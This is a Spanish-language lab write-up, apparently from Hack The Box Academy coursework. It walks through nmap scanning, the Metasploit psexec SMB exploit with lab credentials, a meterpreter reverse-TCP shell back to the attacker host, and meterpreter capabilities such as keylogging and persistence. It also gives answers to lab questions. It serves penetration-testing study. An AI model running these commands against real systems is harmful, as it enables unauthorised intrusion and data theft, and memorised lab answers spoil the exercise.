Con NMAP, realizamos una búsqueda básica de puertos abiertos sobre el host 10.129.164.24:

```shell-session
Polika4RM@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

Vemos que esta máquina Windows tiene el puerto 445 abierto, pues, probaremos Metasploit contra el servicio SMB.
Abrimos la consola de metasploit con el comando:
```
msfconsole
```

Buscaremos con metasploit módulos relacionados con el servicio SMB:
```shell-session
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
    ...
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

Cada módulo tiene un número asociado a la izquierda del todo, que lo identifica. Este número no es fijo y depende de la búsqueda que realicemos.
Vamos a estudiar el *`56 exploit/windows/smb/psexec`*
- psexec define la herramienta que se utilizará para intentar vulnerar el sistema. 

Vamos a seleccionar tal módulo con:
```shell-session
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

Con *"options"* podemos visualizar las opciones que nos permite configurar dicho módulo:

```shell-session
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Para que mi exploit funcione, tengo que configurar algunos parámetros, algunos de ellos obligatorios:
```shell-session
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Lanzamos el exploit y nos devuelve una sesión de meterpreter:
```shell-session
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Metasploit hace varias cosas:
- Corre el exploit: Intenta aprovechar la vulnerabilidad del sistema objetivo (en este caso, SMB con psexec).
- Entrega el payload: Usa Meterpreter, un payload especial que abre un “canal de comunicación” con tu máquina.

----

## ¿Qué es Meterpreter:?

En ciberseguridad, una carga útil (PAYLOAD) es el código que se ejecuta en la máquina objetivo después de que un exploit aproveche una vulnerabilidad.

El exploit abre la puerta mientras que el PAYLOAD es el conjunto de órdenes que introduzco a la víctima para aprovecharme de ella. 

Yo podía:
- Subir y bajar archivos (`upload`, `download`).
- Migrar procesos (`migrate`).
- Tomar capturas de pantalla (`screenshot`).
- Registrar teclas (`keyscan_start`).
- Escalar privilegios con scripts.
- Persistencia en el sistema.

Puedo invocar a una *SHELL* escribiendo "shell".

---
**QUESTIONS**
**Target: 10.129.201.160**
**Authenticate to 10.129.201.160 (ACADEMY-SHELLS-WIN10MSF) with user "htb-student" and password "HTB_@cademy_stdnt!"**
**1. What command language interpreter is used to establish a system shell session with the target?**
En primer lugar, ejecutamos un escaneo básico de nmap para ver que puertos y servicios asociados están disponibles:
```
sudo nmap -sV --open --min-rate 2000 -Pn -n 10.129.201.160
```
Y encontramos:
```
PORT     STATE SERVICE      VERSION
7/tcp    open  echo
9/tcp    open  discard?
13/tcp   open  daytime      Microsoft Windows USA daytime
17/tcp   open  qotd         Windows qotd (English)
19/tcp   open  chargen
80/tcp   open  http         Microsoft IIS httpd 10.0
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
2179/tcp open  vmrdp?
Service Info: Host: SHELLS-WIN10; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Tiene el puerto 445 abierto -> correspondiente al servicio SMB

Entramos a *msfconsole* y ejecutamos:
```
use exploit/windows/smb/psexec
set RHOSTS 10.129.201.160
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
run
```

Y vemos que durante la ejecución del PAYLOAD, se utiliza una PowerShell:

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> run
[*] Started reverse TCP handler on 94.237.122.209:4444 
[*] 10.129.201.160:445 - Connecting to the server...
[*] 10.129.201.160:445 - Authenticating to 10.129.201.160:445 as user 'htb-student'...
[*] 10.129.201.160:445 - Selecting PowerShell target
[*] 10.129.201.160:445 - Executing the payload...
```

**2.  Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)**

Siguiendo los pasos anteriores, en el momento de ejecutar el comando se nos abre una sesión de meterpreter. 
Ejecutamos:
```
shell
```
Para acceder a una terminal shell de windows y accedemos al directorio users/htb-student/documents. 
En dicho directorio, se encuentra el archivo respuesta al ejercicio, llamado: *staffsalaries.txt*.

